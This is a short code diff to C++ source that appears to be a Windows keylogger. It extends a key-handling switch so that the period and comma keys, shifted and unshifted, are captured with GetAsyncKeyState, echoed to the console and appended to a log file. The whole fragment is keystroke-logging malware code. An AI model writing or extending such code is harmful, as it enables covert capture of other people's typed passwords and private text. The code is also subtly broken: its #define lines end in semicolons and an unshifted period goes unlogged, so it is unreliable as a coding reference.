@@ -28,6 +28,8 @@
 #define VK_CAPITAL 0x14;
 #define VK_SNAPSHOT 0x2c; 
 #define VK_LMENU 0xA4;
+#define VK_OEM_PERIOD 0xBE; 
+#define VK_OEM_COMMA 0xBC;
 
 
 void WriteToFile(LPCSTR text)
@@ -124,17 +126,24 @@ bool Key_is_Listed(WORD iKey)
 		WriteToFile("9");
 		break;
 
-	case 58:
+	case 0xBE:
 		if (GetAsyncKeyState(0xA0))
 		{
-
+			std::cout << ">";
+			WriteToFile(">");
 		}
 		break;
 
-	case 59:
+	case 0xBC:
 		if (GetAsyncKeyState(0xA0))
 		{
-
+			std::cout << "<";
+			WriteToFile("<");
+		}
+		else
+		{
+			std::cout << ",";
+			WriteToFile(",");
 		}
 		break;
 
